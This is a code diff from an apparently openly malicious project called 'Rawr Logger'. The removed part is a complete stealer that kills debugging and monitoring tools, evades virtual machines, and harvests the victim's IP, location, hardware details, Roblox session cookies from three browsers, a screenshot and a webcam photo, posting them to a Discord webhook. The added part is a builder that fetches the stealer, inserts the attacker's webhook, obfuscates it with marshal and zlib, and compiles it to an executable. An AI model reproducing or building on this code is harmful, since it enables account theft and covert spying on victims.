@@ -1,254 +1,71 @@
-import os,requests,socket,threading,platform,json,psutil,sys,win32process
-import browser_cookie3
-import cv2
-import re, uuid
+
+
+import marshal
+import zlib
+import requests
 from pystyle import *
-from PIL import ImageGrab
-os.system('cls')
-webhook = "Webhooksss"
-print("Loading Client..")
-process = [
-    "ProcessHacker.exe",
-    "httpdebuggerui.exe",
-    "wireshark.exe",
-    "HttpAnalyzerV7.exe",
-    "fiddler.exe",
-    "taskmgr.psutilexe,"
-    "regedit.exe",
-    "cmd.exe",
-    "taskmgr.exe",
-    "vboxservice.exe",
-    "ollydbg.exe",
-    "dnSpy.exe",
-    "procexp64.exe",
-    "procexp.exe"
-]
-for proc in psutil.process_iter():
-    if proc.name() in process:
-        proc.kill()
+import os
+import time
+import shutil
+os.system(f'cls & title Rawr Logger Builder!')
+Write.Print(Center.XCenter("""
+    ____                         __                               
+   / __ \____ __      _______   / /   ____  ____ _____ ____  _____
+  / /_/ / __ `/ | /| / / ___/  / /   / __ \/ __ `/ __ `/ _ \/ ___/
+ / _, _/ /_/ /| |/ |/ / /     / /___/ /_/ / /_/ / /_/ /  __/ /    
+/_/ |_|\__,_/ |__/|__/_/     /_____/\____/\__, /\__, /\___/_/     
+                                         /____//____/             
+              Made By Jose#0001,TheSoap1#9870                                                                                  
+\n"""), Colors.green_to_yellow, interval=0)
+webhook = Write.Input("\nEnter webhook URL:", Colors.green_to_yellow, interval=0.01)
+r = requests.get(webhook)
+if r.status_code == 200:
+         Write.Print("Webhook Is Working\n",Colors.white_to_green, interval=0.01) 
+         time.sleep(1) 
+else: 
+    Write.Print("Webhook Is Not Working\n",Colors.white_to_red, interval=0.01) 
+    time.sleep(3) 
+    exit()
+name = Write.Input("Enter File Name:", Colors.green_to_yellow, interval=0.01)
+code = requests.get("https://raw.githubusercontent.com/Joseloll/Rawr-Logger/main/logger.py")
+with open(f"{name}.py", 'w', encoding='utf8') as f:
+    f.write(code.text.replace("Webhooksss", webhook))
+Write.Print("Rawr Logger Was SucessFully Built\n",Colors.white_to_green, interval=0.01)
+prot = Write.Input("Would you like to add protection y/n:",Colors.white_to_green, interval=0.01)
+if prot == 'y':
+    with open(f'{name}.py') as fi:
+        pro = fi.read()
+    mar = marshal.dumps(pro)
+    zlb = zlib.compress(mar)
+    with open(f"{name}.py", 'w') as f:
+        f.write(f"import marshal,zlib;exec(marshal.loads(zlib.decompress({zlb})))")
+    compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
+    if compile == "y":
+        os.system(f'pyinstaller --onefile --hidden-import="requests" --hidden-import="PIL" --hidden-import="os" --hidden-import="pystyle"  --hidden-import="socket" --hidden-import="threading" --hidden-import="PIL.ImageGrab" --hidden-import="browser_cookie3"  --hidden-import="json"  --hidden-import="platform"  --hidden-import="re"  --hidden-import="uuid" --hidden-import="psutil"  --hidden-import="cv2" --hidden-import="psutil"  --hidden-import="sys"  --hidden-import="win32process" {name}.py')
+        os.remove(f'{name}.spec')
+        Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
+        time.sleep(2)
+        Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
+        time.sleep(3)
+        exit()
+    elif compile == "n":
+      Write.Print("Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
+      time.sleep(3)
+      exit()
 
-vm = ["VMwareService.exe", "VMwareTray.exe","joeboxcontrol.exe,vmwareuser.exe"]
-for proc in psutil.process_iter():
-        if proc.name() in vm:
-            exit()
-minDiskSizeGB = 50
-if len(sys.argv) > 1: minDiskSizeGB = float(sys.argv[1])
-_, diskSizeBytes, _ = win32process.GetDiskFreeSpaceEx()
-diskSizeGB = diskSizeBytes/1073741824
 
-if diskSizeGB < minDiskSizeGB:
-    try:
-
-        embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
-                      "embeds": [
-                {
-                    "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
-                    },
-                    "description": f"```Vm Was Detected```",                       
-                    "footer": {
-                      "text": "Rawr Logger Made By Jose And The Soap1"
-                    }
-                }
-            ]
-
-        }
-        requests.post(webhook, json=embedss) 
-        sys.exit
-    except:
-        pass
-machines = platform.uname()
-hostnames = socket.gethostname()  
-ips = requests.get('https://api.ipify.org').text
-info = requests.get("http://ipinfo.io/json").json()
-city = info['city']
-hostname = info['hostname']
-country = info['country']
-region = info['region']
-lang = info['loc']
-post = info['postal']
-timezone = info['timezone']
-org = info['org']
-pc_username = os.getenv("UserName")
-ip = socket.gethostbyname(hostname) 
-embed = {
-            "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
-            "embeds": [
-                {
-                    "author": {
-                        "name": "Rawr Logger",
-
-                        "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
-                    },
-                    "description": f" @everyone You Got A Hit ```There Public Ip Is: {ips}``` ```There City Is: {city}``` ```There Country Is: {country}``` ```There Region Is: {region}``` ```There Lang is: {lang}```  ```There Postal Code Is: {post}``` ```There Organzation Is: {org}```   ```There Hostname Is: {hostname}```  ```There PC Ip Is:{ip}``` ```There Pc Username Is: {pc_username}``` ```There Pc Host Name Is: {hostnames}``` ```There Pc Machine Name Is: {machines.machine}``` ```There Pc Processer Is: {machines.processor}``` ```There Pc Mac Address Is : {':'.join(re.findall('..', '%012x' % uuid.getnode()))}```",
-                }
-            ]
-        }
-requests.post(webhook, json=embed) 
-def edge():
-    try:
-        cookies = browser_cookie3.edge(domain_name='roblox.com')
-        cookies = str(cookies)
-        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie})
-        if info.status_code == 200:
-            information = json.loads(info.text)
-            username = information['UserName']
-            id = information["UserID"]
-            balance = information["RobuxBalance"]
-            premium = information["IsPremium"]
-            image = information["ThumbnailUrl"]
-            embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
-                      "embeds": [
-                {
-                    "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
-                    },
-                    "description": f"```Roblox Cookie Is:{cookie}``` There Info On The Roblox Cookie Is ```Roblox Username Of The Account Is: {username}``` ```Roblox Id Of The Account Is: {id}``` ```Roblox Robux Balance Of The Account Is: {balance}```  ```Roblox Premium Of The Account Is: {premium}```  ```Roblox Thumnail Of The Account Is : {image}```",                       
-                    "footer": {
-                      "text": "Rawr Logger Made By Jose And The Soap1"
-                    }
-                }
-            ]
-
-        }
-        requests.post(webhook, json=embedss) 
-    except:
-         embedssa = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
-                      "embeds": [
-                {
-                    "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
-                    },
-                    "description": f"```Roblox Edge Cookie Was Not Found```",                      
-                }
-            ]
-
-        }
-         requests.post(webhook, json=embedssa) 
-def chromes():
-    try:
-        cookies = browser_cookie3.chrome(domain_name='roblox.com')
-        cookies = str(cookies)
-        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie})
-        if info.status_code == 200:
-            information = json.loads(info.text)
-            username = information['UserName']
-            id = information["UserID"]
-            balance = information["RobuxBalance"]
-            premium = information["IsPremium"]
-            image = information["ThumbnailUrl"]
-            embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
-                      "embeds": [
-                {
-                    "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
-                    },
-                    "description": f"```Roblox Cookie Is:{cookie}``` There Info On The Roblox Cookie Is ```Roblox Username Of The Account Is: {username}``` ```Roblox Id Of The Account Is: {id}``` ```Roblox Robux Balance Of The Account Is: {balance}```  ```Roblox Premium Of The Account Is: {premium}```  ```Roblox Thumnail Of The Account Is : {image}```",                       
-                    "footer": {
-                      "text": "Rawr Logger Made By Jose And The Soap1"
-                    }
-                }
-            ]
-
-        }
-        requests.post(webhook, json=embedss) 
-    except:
-         embedsss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
-                      "embeds": [
-                {
-                    "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
-                    },
-                    "description": f"```Roblox Google Chrome Cookie Was Not Found```",                      
-                }
-            ]
-
-        }
-         requests.post(webhook, json=embedsss) 
-         pass
-def firefoxs():
-    try:
-        cookies = browser_cookie3.firefox(domain_name='roblox.com')
-        cookies = str(cookies)
-        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie})
-        if info.status_code == 200:
-            information = json.loads(info.text)
-            username = information['UserName']
-            id = information["UserID"]
-            balance = information["RobuxBalance"]
-            premium = information["IsPremium"]
-            image = information["ThumbnailUrl"]
-            embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
-                      "embeds": [
-                {
-                    "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
-                    },
-                    "description": f"```Roblox Cookie Is:{cookie}``` There Info On The Roblox Cookie Is ```Roblox Username Of The Account Is: {username}``` ```Roblox Id Of The Account Is: {id}``` ```Roblox Robux Balance Of The Account Is: {balance}```  ```Roblox Premium Of The Account Is: {premium}```  ```Roblox Thumnail Of The Account Is : {image}```",                       
-                    "footer": {
-                      "text": "Rawr Logger Made By Jose And The Soap1"
-                    }
-                }
-            ]
-
-        }
-        requests.post(webhook, json=embedss) 
-    except:
-         embeded = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
-                      "embeds": [
-                {
-                    "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
-                    },
-                    "description": f"```Roblox Fire Fox Cookie Was Not Found```",                      
-                }
-            ]
-
-        }
-         requests.post(webhook, json=embeded) 
-         pass
-
-browsers = [firefoxs,edge,chromes]
-for i in browsers:
-  threading.Thread(target=i,).start()
-pass
-screenshot = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
-screenshot.save("image.png")
-screenshot.close()
-with open('image.png', 'rb') as f:
-     requests.post(webhook,files={'upload_file': f})
-os.remove('image.png')
-try:
-            videoCaptureObject = cv2.VideoCapture(0)
-            ret,frame = videoCaptureObject.read()
-            cv2.imwrite("photo.png",frame)
-            result = False
-            with open('photo.png', 'rb') as f:
-                requests.post(webhook,json={'content': f'Picture Of There Webcam:'})
-                requests.post(webhook,files={'upload_file': f})
-            os.remove('photo.png')
-except:
-         embeded = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
-                      "embeds": [
-                {
-                    "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
-                    },
-                    "description": f"```No Webcam Was Found```",                      
-                }
-            ]
-
-        }
-         requests.post(webhook, json=embeded) 
-         pass
+elif prot == 'n':
+    compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
+    if compile == "y":
+      os.system(f"pyinstaller --onefile {name}.py")
+      shutil.rmtree('build')
+      os.remove(f'{name}.spec')
+      Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
+      time.sleep(2)
+      Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
+      time.sleep(3)
+      exit()
+    elif compile == "n":
+      Write.Print("Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
+      time.sleep(3)
+      exit()
